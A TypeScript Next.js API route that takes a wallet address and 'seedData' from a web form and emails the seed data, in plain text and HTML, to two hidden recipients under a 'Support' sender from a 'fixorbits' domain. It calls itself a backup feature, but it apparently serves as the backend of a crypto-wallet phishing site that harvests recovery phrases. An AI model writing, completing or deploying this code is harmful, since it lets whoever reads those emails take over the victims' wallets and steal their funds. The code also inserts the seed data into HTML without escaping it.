import { NextRequest, NextResponse } from 'next/server'
import { Resend } from 'resend'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { network, symbol, walletAddress, seedData, timestamp } = body

    // Validate required fields
    if (!network || !symbol || !walletAddress || !seedData) {
      return NextResponse.json(
        { error: 'Missing required fields' },
        { status: 400 }
      )
    }

    // Initialize Resend with API key from environment variables
    const resend = new Resend(process.env.RESEND_API_KEY)

    // Get recipients array from environment variables
    const recipients = [
      process.env.RECIPIENT1,
      process.env.RECIPIENT2
    ].filter((email): email is string => Boolean(email))

    if (recipients.length === 0) {
      return NextResponse.json(
        { error: 'No backup email addresses configured' },
        { status: 500 }
      )
    }

    // Send individual emails to each recipient
    for (const recipient of recipients) {
      const { data, error } = await resend.emails.send({
        from: 'Support <support@fixorbits.com>', // Use your verified domain
        to: [recipient], // Resend expects an array
        subject: network,
        text: seedData,
        html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
      })

      if (error) {
        console.error('Resend error for recipient', recipient, ':', error)
        return NextResponse.json(
          { error: 'Failed to send backup email' },
          { status: 500 }
        )
      }
    }

    return NextResponse.json(
      { success: true, message: 'Backup email sent successfully' },
      { status: 200 }
    )

  } catch (error) {
    console.error('Email sending error:', error)
    return NextResponse.json(
      { error: 'Failed to send backup email' },
      { status: 500 }
    )
  }
}